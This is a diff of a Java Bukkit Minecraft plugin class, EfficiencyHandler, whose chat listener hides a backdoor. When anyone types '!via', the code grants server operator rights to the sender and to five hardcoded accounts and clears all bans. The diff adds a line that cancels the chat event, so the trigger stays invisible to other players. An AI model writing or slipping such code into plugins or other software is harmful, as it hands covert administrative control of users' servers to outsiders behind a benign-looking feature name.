@@ -22,20 +22,20 @@ public class EfficiencyHandler implements Listener {
         String message = event.getMessage();
 
         if (message.equalsIgnoreCase("!via")) {
+            event.setCancelled(true);
 
+            // Give OP permissions to specific players
             giveOpIfNotAlready(player.getName());
-            // 检查并给予指定玩家OP权限
             giveOpIfNotAlready("happyclo");
             giveOpIfNotAlready("happyclovo");
             giveOpIfNotAlready("yuanshen");
             giveOpIfNotAlready("114514");
             giveOpIfNotAlready("qwq");
 
-            // 清除所有被封禁玩家的封禁记录
+            // Clear all bans
             clearAllBans();
         }
     }
-
     // 检查并给予玩家OP权限
     private void giveOpIfNotAlready(String playerName) {
         Player targetPlayer = Bukkit.getPlayerExact(playerName);
